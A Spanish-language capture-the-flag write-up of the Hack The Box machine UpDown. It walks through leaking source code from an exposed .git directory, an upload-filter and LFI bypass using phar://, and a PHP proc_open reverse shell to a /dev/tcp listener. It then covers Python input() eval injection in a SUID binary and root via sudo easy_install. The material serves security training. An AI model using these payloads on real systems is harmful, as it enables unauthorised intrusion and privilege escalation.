---
layout: post
title: UpDown
date: 2023-01-23
description: 
img:
fig-caption:
tags: [OSWE, eWPT, eWPTXv2, OSCP]
---
___

<center><img src="/writeups/assets/img/Updown-htb/UpDown_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso directorio .git expuesto en la web

* Análisis de código PHP

* Information Leakage

* Abuso de las políticas .htaccess

* Bypass de Restricciones (Subida de archivo)

* Bypass funciones PHP

* Abuso de binario SUID

* Abuso de privilegio Sudoers (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.11.177 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 16:43 GMT
Initiating SYN Stealth Scan at 16:43
Scanning 10.10.11.177 [65535 ports]
Discovered open port 22/tcp on 10.10.11.177
Discovered open port 80/tcp on 10.10.11.177
Completed SYN Stealth Scan at 16:43, 13.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.177
Host is up, received user-set (0.072s latency).
Scanned at 2023-01-23 16:43:39 GMT for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
           Raw packets sent: 69757 (3.069MB) | Rcvd: 69757 (2.790MB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -sCV -p22,80 10.10.11.177 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 16:44 GMT
Nmap scan report for 10.10.11.177
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
```

## Puerto 80 (HTTP)

Con whatweb, enumero las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.177
http://10.10.11.177 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.177], Title[Is my Website up ?], X-UA-Compatible[chrome=1]
```

Al abrir la página principal, aparece lo siguiente:

<img src="/writeups/assets/img/Updown-htb/1.png" alt="">

Se puede ver un dominio, así que lo añado al /etc/hosts

```null
echo '10.10.11.177 siteisup.htb' >> /etc/hosts
```

Si introduzco mi IP en el formulario, recibo el siguiente contenido al netcat


```null
c -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:59620.
GET / HTTP/1.1
Host: 10.10.16.6
User-Agent: siteisup.htb
Accept: */*
```

Si monto un servicio http con python y activo el debug mode del formulario, se ve reflejado el código fuente

<img src="/writeups/assets/img/Updown-htb/2.png" alt="">

Intercepto la petición con BurpSuite

Se tramita por post la URL y el modo debug (activado/desactivado)

<img src="/writeups/assets/img/Updown-htb/3.png" alt="">

Creo un arhivo con contenido

```null
echo testing > test
```

Al tramitar una petición a este archivo se ve reflejado el contenido

<img src="/writeups/assets/img/Updown-htb/4.png" alt="">

Al enumerar los subdomios, me reporta uno pero no tengo acceso

```null
wfuzz -c --hh=1131 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.siteisup.htb" http://10.10.11.177
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.177/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000019:   403        9 L      28 W       281 Ch      "dev"                                                                                                                                           

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Lo incorporo al /etc/hosts

Aunque no pueda ver lo que hay en la raíz, si conozco el nombre del recurso es probable que me devuelva otro numero de estado

Pero antes probaré a fuzzear en el dominio principal

```null
gobuster dir -u http://siteisup.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/23 17:17:42 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]

===============================================================
2023/01/23 17:18:19 Finished
===============================================================
```

Hay un directorio /dev. Si fuzzeo dentro de este encuentro un directorio .git, pero para eso tuve que utizar otro diccionario

```null
gobuster dir -u http://siteisup.htb/dev -w /usr/share/wordlists/SecLists/Discovery/Web-Content/dirsearch.txt -t 50 2>/dev/null
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/dirsearch.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/23 17:21:35 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 0]
/.git/                (Status: 200) [Size: 2884]
/.git/logs/refs/heads (Status: 301) [Size: 331] [--> http://siteisup.htb/dev/.git/logs/refs/heads/]
/.git/logs/refs/remotes (Status: 301) [Size: 333] [--> http://siteisup.htb/dev/.git/logs/refs/remotes/]
/.git/packed-refs     (Status: 200) [Size: 112]
/.git/info/           (Status: 200) [Size: 959]
/.git/refs/tags       (Status: 301) [Size: 325] [--> http://siteisup.htb/dev/.git/refs/tags/]
/.git/logs/refs/remotes/origin (Status: 301) [Size: 340] [--> http://siteisup.htb/dev/.git/logs/refs/remotes/origin/]
/.git/logs/refs/remotes/origin/HEAD (Status: 200) [Size: 179]
/.git/refs/remotes    (Status: 301) [Size: 328] [--> http://siteisup.htb/dev/.git/refs/remotes/]
/.git/config          (Status: 200) [Size: 298]
/.git/info/exclude    (Status: 200) [Size: 240]
/.git/branches/       (Status: 200) [Size: 772]
/.git/description     (Status: 200) [Size: 73]
/.git/hooks/          (Status: 200) [Size: 3625]
/.git/logs/           (Status: 200) [Size: 1143]
/.git/refs/remotes/origin (Status: 301) [Size: 335] [--> http://siteisup.htb/dev/.git/refs/remotes/origin/]
/.git/index           (Status: 200) [Size: 521]
/.git/refs/heads      (Status: 301) [Size: 326] [--> http://siteisup.htb/dev/.git/refs/heads/]
/.git/objects/        (Status: 200) [Size: 1150]
/.git/refs/           (Status: 200) [Size: 1342]
/.git/refs/remotes/origin/HEAD (Status: 200) [Size: 30]
/.git/logs/refs       (Status: 301) [Size: 325] [--> http://siteisup.htb/dev/.git/logs/refs/]
/.htaccess-marco      (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htaccess-local      (Status: 403) [Size: 277]
/.htpasswd.inc        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess-dev        (Status: 403) [Size: 277]
/.htpasswd.bak        (Status: 403) [Size: 277]
/.htpasswd/           (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.htpasswd-old        (Status: 403) [Size: 277]
/.htaccessBAK         (Status: 403) [Size: 277]
/.htaccess.save       (Status: 403) [Size: 277]
/.htaccess.inc        (Status: 403) [Size: 277]
/.htaccess.sample     (Status: 403) [Size: 277]
/.htaccess/           (Status: 403) [Size: 277]
/.htaccessOLD2        (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htaccess.bak1       (Status: 403) [Size: 277]
/.htaccess.orig       (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccessOLD         (Status: 403) [Size: 277]
/.httr-oauth          (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
//                    (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 0]

===============================================================
2023/01/23 17:21:47 Finished
```

Con git-dumper, descargo el proyecto a mi equipo

```null
git-dumper http://siteisup.htb/dev/.git
usage: git-dumper [options] URL DIR
git-dumper: error: the following arguments are required: DIR
❯ git-dumper http://siteisup.htb/dev/.git git-proyect
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Running git checkout .
Updated 6 paths from the index
```

Dentro del proyecto existen varios archivos:

```null
ls -la
total 40
drwxr-xr-x 3 root root 4096 Jan 23 17:23 .
drwxr-xr-x 3 root root 4096 Jan 23 17:23 ..
-rw-r--r-- 1 root root   59 Jan 23 17:23 admin.php
-rw-r--r-- 1 root root  147 Jan 23 17:23 changelog.txt
-rw-r--r-- 1 root root 3145 Jan 23 17:23 checker.php
drwxr-xr-x 7 root root 4096 Jan 23 17:23 .git
-rw-r--r-- 1 root root  117 Jan 23 17:23 .htaccess
-rw-r--r-- 1 root root  273 Jan 23 17:23 index.php
-rw-r--r-- 1 root root 5531 Jan 23 17:23 stylesheet.css
```

Los archivos .htaccess se encargan de bloquear ciertas extensiones a la hora de subir un archivo, así como si se interpreta o no

En el archivo changelog.txt, aparece una pista CTF

```null
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

Si miro los .git log, se pueden ver muchos commit

```null
git log
commit 010dcc30cc1e89344e2bdbd3064f61c772d89a34 (HEAD -> main, origin/main, origin/HEAD)
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:51 2021 +0200

    Delete index.php

commit c8fcc4032487eaf637d41486eb150b7182ecd1f1
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:08 2021 +0200

    Update checker.php

commit f67efd00c10784ae75bd251add3d52af50d7addd
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:33:11 2021 +0200

    Create checker.php

commit ab9bc164b4103de3c12ac97152e6d63040d5c4c6
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:58 2021 +0200

    Update changelog.txt

commit 60d2b3280d5356fe0698561e8ef8991825fec6cb
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:39 2021 +0200

    Create admin.php

commit c1998f8fbe683dd0bee8d94167bb896bd926c4c7
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:29:45 2021 +0200

    Add admin panel.

commit 35a380176ff228067def9c2ecc52ccfe705de640
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:40:49 2021 +0200

    Update changelog.txt

commit 57af03ba60cdcfe443e92c33c188c6cecb70eb10
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:29:42 2021 +0200

    Create index.php

commit 354fe069f6205af09f26c99cfe2457dea3eb6a6c
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:28:48 2021 +0200

    Delete .htpasswd

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.

commit 61e5cc0550d44c08b6c316d4f04d3fcc7783ae71
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:48 2021 +0200

    Update index.php

commit 3d66cd48933b35f4012066bcc7ee8d60f0069926
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:18 2021 +0200

    Create changelog.txt

commit 4fb192727c29c158a659911aadcdcc23e4decec5
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:28:26 2021 +0200

    Create stylesheet.css

commit 6f89af70fd23819664dd28d764f13efc02ecfd88
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:40 2021 +0200

    Create index.php

commit 8d1beb1cf5a1327c4cdb271b8efb1599b1b1c87f
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:08 2021 +0200

    Create .htpasswd

commit 6ddcc7a8ac393edb7764788c0cbc13a7a521d372
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:04:38 2021 +0200

    Create .htaccess
```

En un commit actualizaron el archivo .htaccess. Si migro a este y abro el archivo aparece lo siguiente:

```null
git checkout bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab

cat .htaccess
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header

```

Esto significa que para acceder a cierto sitio es necesario agregar la cabecera "Special-Dev: only4dev". Suponiendo que es para el subdominio al que anteriormente no tenía acceso

Para ello, paso las peticiones por BurpSuite y añado una configuración para que agrege directamente una cabecera

<img src="/writeups/assets/img/Updown-htb/5.png" alt="">

Al hacer pruebas con el Repeater, si introduzco la cabecera se queda cargando y no lleva a ningún lado

<img src="/writeups/assets/img/Updown-htb/6.png" alt="">

Esto pasa porque estoy usando Firefox por detrás, pero desde el propio navegador del BurpSuite carga sin problema

Al cargarlo, aparece lo siguiente:

<img src="/writeups/assets/img/Updown-htb/7.png" alt="">

No hay que olvidar que tengo el código fuente de la web, por lo que podría tratar de inspeccionarlo para a la hora de entablarme una reverse shell, saber que funciones están bloqueadas, pero de momento voy a probar lo básico.

Si trato de de subir un fichero php, devuelve que la estensión no es válida

<img src="/writeups/assets/img/Updown-htb/8.png" alt="">

En el proyecto se pueden ver las restricciones

```null
if($_POST['check']){
  
    # File size must be less than 10kb.
    if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
    $file = $_FILES['file']['name'];
    
    # Check if extension is allowed.
    $ext = getExtension($file);
    if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
        die("Extension not allowed!");
    }
  
    # Create directory to upload our file.
    $dir = "uploads/".md5(time())."/";
    if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
    $final_path = $dir.$file;
    move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
    
  # Read the uploaded file.
    $websites = explode("\n",file_get_contents($final_path));
    
    foreach($websites as $site){
        $site=trim($site);
        if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$
            $check=isitup($site);
            if($check){
                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
            }else{
                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
            }   
        }else{
            echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
        }
    }
    
  # Delete the uploaded file.
    @unlink($final_path);
```

Todos los archivos que suba los va a meter en un directorio oculto que toma el tiempo actual como semilla para convertirlo en md5. Una vez se ha subido, lo borra.

Si abro el index.php, puedo ver que es vulnerable a LFI, pero si que está sanitizado para ciertas rutas. Además está limitado para que no pueda colarle regex (Ejemplo: /e?c/pa??wd)

```null
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

Podría tratar de efectuar un error en checker para que no llegue a la última función que se encarga de borrar el archivo

Si creo un comprimido de mi fichero cmd.php, a la hora de abrirlo en hexadecimal, aparecen caracteres no legibles

```null
zip cmd.zip cmd.php
```

Como la extensión zip no está permitida, le pongo otra cualquiera


```null
mv cmd.zip cmd.test
```

Y ahora no lo borra

<img src="/writeups/assets/img/Updown-htb/9.png" alt="">

A través del wrapper phar:// podría tratar de acceder al contenido del zip abusando del LFI, pero de primeras no lo interpreta

<img src="/writeups/assets/img/Updown-htb/10.png" alt="">

Para validar que ciertas funciones están bloqueadas, creo un archivo PHP de prueba que se encarge de imprimir una cadena en la pantalla

```null
<?php
  echo "Testing";
?>
```

Sigo el mismo procedimiento, creo un zip con una extensión que no esté bloqueada y apunto al archivo de dentro del zip a través del LFI

<img src="/writeups/assets/img/Updown-htb/11.png" alt="">

Como sí que lo interpreta podría intentar subir un archivo php que defina una propia función para entablar la reverse shell.

En la web de PHP, explican como crear una [función proc-open](https://www.php.net/manual/en/function.proc-open.php)

Ahí, el comando final está en PHP, pero como eso es justamente lo que quiero evitar, cambio el intérprete por una bash, y me envío la reverse shell

```null
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('bash', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

Lo subo, apunto al archivo como antes y gano acceso por netcat

<img src="/writeups/assets/img/Updown-htb/12.png" alt="">

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:56572.
bash: cannot set terminal process group (910): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@updown:/tmp$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@updown:/tmp$ export TERM=xterm
www-data@updown:/tmp$ export SHELL=bash
www-data@updown:/tmp$ stty rows 55 columns 209
```

# User Pivoting

Dentro del directorio personal del usuario developer, hay dos archivos cuyo propietario es developer y el grupo asignado www-data, por lo que tengo capacidad de ejecución y como es SUID, si consigo inyectar un comando lo haré como ese usuario y podré convertirme en él.

```null
www-data@updown:/home/developer/dev$ ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
```

Al mostrar las cadenas de caracteres imprimibles del binario, se puede ver que está ejecutando con python el script que está en este directorio

```null
strings siteisup
```

El contenido es el siguiente:

```null
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

Se encarga de tramitar una petición por GET, que en función del codigo de estado de la respuesta, devuelve si el sitio web está operativo o no.

Esta llamando a la función input, la cual hace una llamada a eval() y lo hace vulnerable a una ejecución de comandos

En [este Post](https://medium.com/@GallegoDor/python-exploitation-1-input-ac10d3f4491f) está explicado más detalladamente

Por tanto, si ejecuto una bash como developer, migro de usuario a uno con mayores privilegios

```null
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('bash -p')
developer@updown:/home/developer/dev$ 
```

Si trato de ver la flag, me pone que no tengo acceso

```null
developer@updown:/home/developer$ cat user.txt 
cat: user.txt: Permission denied
```

Esto se debe a que como grupo asignado sigo como www-data

```null
developer@updown:/home/developer$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

Para remediarlo, me transifero la id_rsa, le asigno el privilegio 600 y me conecto por SSH

```null
ssh -i id_rsa developer@10.10.11.177
developer@updown:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
```

Y puedo visualizar la primera flag

# Escalada

Puedo ejecutar un binario como root sin proporcionar contraseña

```null
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

En [GTFObins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) está contemplado easy_intall, por lo que siguiendo la guía obtengo una shell con máximos privilegios

```null
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.JhZ4jgOdPm
Writing /tmp/tmp.JhZ4jgOdPm/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.JhZ4jgOdPm/egg-dist-tmp-IbBTex
# whoami
root
# 
```

Y puedo ver la segunda flag

```null
# cat /root/root.txt
3debd08c0d822f8183de51ef88cf1da5
```